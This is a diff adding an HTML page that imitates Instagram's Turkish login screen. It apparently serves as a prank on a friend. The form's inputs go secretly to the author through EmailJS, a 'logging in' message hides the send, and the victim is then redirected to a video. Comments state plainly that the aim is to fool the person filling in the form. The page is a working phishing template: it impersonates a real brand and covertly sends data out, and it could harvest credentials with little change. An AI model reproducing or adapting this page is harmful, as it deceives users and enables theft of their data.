@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Giriş Yap</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #000000;
+            color: #f5f5f5;
+        }
+        /* Instagram gradient borders or effects if needed */
+        .instagram-gradient-icon {
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #df4996 45%, #a237b0 60%, #515ecf 90%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between items-center py-6 px-4 bg-black selection:bg-pink-500 selection:text-white">
+
+    <div class="w-full flex justify-center pt-2">
+        <button class="text-xs text-zinc-400 hover:text-zinc-200 transition flex items-center gap-1 font-normal">
+            Türkçe <i class="fa-solid fa-chevron-down text-[10px] ml-0.5"></i>
+        </button>
+    </div>
+
+    <main class="w-full max-w-[350px] flex flex-col items-center justify-center my-auto">
+        
+        <div class="mb-10 flex justify-center">
+            <!-- SVG Instagram Gradient Logo -->
+            <svg aria-label="Instagram" class="w-[72px] h-[72px]" fill="url(#instagram-gradient)" role="img" viewBox="0 0 24 24">
+                <defs>
+                    <radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%">
+                        <stop offset="0%" stop-color="#fdf497" />
+                        <stop offset="5%" stop-color="#fdf497" />
+                        <stop offset="45%" stop-color="#df4996" />
+                        <stop offset="60%" stop-color="#a237b0" />
+                        <stop offset="90%" stop-color="#515ecf" />
+                    </radialGradient>
+                </defs>
+                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+            </svg>
+        </div>
+
+        <form class="w-full flex flex-col gap-3.5" onsubmit="handleLogin(event)">
+            <!-- Tahmin / Kelime / Sayı Input -->
+            <div class="relative w-full">
+                <input type="text" id="userGuess" required
+                    class="w-full h-[48px] px-3.5 text-xs text-white bg-[#121212] border border-[#363636] rounded-[9px] focus:outline-none focus:border-[#a8a8a8] placeholder-[#8e8e8e] transition"
+                    placeholder="Tahmin edilecek sayı veya kelime">
+            </div>
+
+            <!-- İpucu Input -->
+            <div class="relative w-full">
+                <input type="text" id="userHint" required
+                    class="w-full h-[48px] px-3.5 text-xs text-white bg-[#121212] border border-[#363636] rounded-[9px] focus:outline-none focus:border-[#a8a8a8] placeholder-[#8e8e8e] transition"
+                    placeholder="İpucu yaz...">
+            </div>
+
+            <!-- Giriş / Gönder Button -->
+            <button type="submit"
+                class="w-full h-[44px] mt-1 bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0077cc] text-white text-sm font-semibold rounded-[9px] transition flex items-center justify-center shadow-sm">
+                Giriş yap
+            </button>
+        </form>
+
+        <div class="mt-4 mb-10">
+            <a href="#" onclick="showCustomMessage(event)" class="text-xs text-[#f5f5f5] hover:text-zinc-400 font-normal transition">
+                Şifreni mi unuttun?
+            </a>
+        </div>
+
+    </main>
+
+    <footer class="w-full max-w-[350px] flex flex-col items-center gap-6 pb-2">
+        <!-- Create Account Outline Button -->
+        <button onclick="showCustomMessage(event)"
+            class="w-full h-[44px] border border-[#0095f6] hover:border-zinc-300 text-[#0095f6] hover:text-white text-sm font-semibold rounded-[22px] transition flex items-center justify-center">
+            Yeni hesap oluştur
+        </button>
+
+        <!-- Meta Logo -->
+        <div class="flex items-center gap-1.5 opacity-90">
+            <svg aria-label="Meta" class="w-[16px] h-[16px] fill-current text-white" viewBox="0 0 24 24">
+                <path d="M12.001 2.002c-3.13 0-5.89 1.63-7.51 4.12l2.36 2.36c1.1-1.77 3.01-2.95 5.15-2.95 3.4 0 6.16 2.76 6.16 6.16s-2.76 6.16-6.16 6.16c-2.67 0-4.93-1.7-5.74-4.08h-3.1c.95 4.13 4.59 7.18 8.84 7.18 5.07 0 9.16-4.1 9.16-9.16s-4.09-9.16-9.16-9.16zm-7.9 7.76c-.07.41-.11.84-.11 1.28 0 2.22.95 4.22 2.47 5.62l-1.68 1.68C3.12 16.59 2 13.93 2 11c0-.98.15-1.92.43-2.82h1.67z"/>
+            </svg>
+            <span class="text-xs font-semibold tracking-wide text-white">Meta</span>
+        </div>
+    </footer>
+</body>
+    <script>
+// 1. EmailJS'i Public Key ile başlatıyoruz
+(function(){
+   emailjs.init({
+     publicKey: "BURAYA_PUBLIC_KEY_DEGERINI_YAZ",
+   });
+})();
+
+// 2. Butona basıldığında çalışan fonksiyon
+function handleLogin(e) {
+    e.preventDefault();
+    
+    // Birinci kutudaki tahmin
+    const tahminEdilenSey = document.getElementById('userGuess').value; 
+    
+    // İkinci kutudaki ipucu
+    const ipucuMetni = document.getElementById('userHint').value; 
+
+    // EmailJS şablonuna gidecek veriler (HTML'deki input ID'lerin bunlarla eşleşmeli)
+    const templateParams = {
+        user_guess: tahminEdilenSey,
+        user_hint: ipucuMetni
+    };
+
+    // Arkadaşa çaktırmamak için ekranda şık bir bildirim gösterelim
+    showCustomMessage(null, `Giriş yapılıyor, lütfen bekleyin...`);
+
+    // Maili gizlice arkaya gönderiyoruz
+    emailjs.send('service_8nosgsfa', 'template_mv7wnkb', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            
+            // Mail gitti! 1.5 saniye sonra arkadaşını yönlendireceğin link
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=EfmVRQjoNcY"; // <--- Komik video linkini buraya yapıştırıyorsun!
+            }, 1500);
+            
+        }, function(error) {
+            console.log('FAILED...', error);
+            showCustomMessage(null, `Bir şeyler ters gitti ama devam et :D`);
+        });
+}
+
+function showCustomMessage(e, customText) {
+    if (e) e.preventDefault();
+    
+    const existingToast = document.getElementById('custom-toast');
+    if (existingToast) existingToast.remove();
+
+    const toast = document.createElement('div');
+    toast.id = 'custom-toast';
+    toast.className = 'fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-[#262626] text-white text-xs px-4 py-3 rounded-lg shadow-xl border border-[#363636] z-50 transition-all duration-300 flex items-center gap-3';
+    toast.innerHTML = `<span>${customText || 'Bu özellik bu örnek tasarım sayfasında simüle edilmektedir.'}</span>`;
+    
+    document.body.appendChild(toast);
+
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+    </script>
+</body>
+</html>
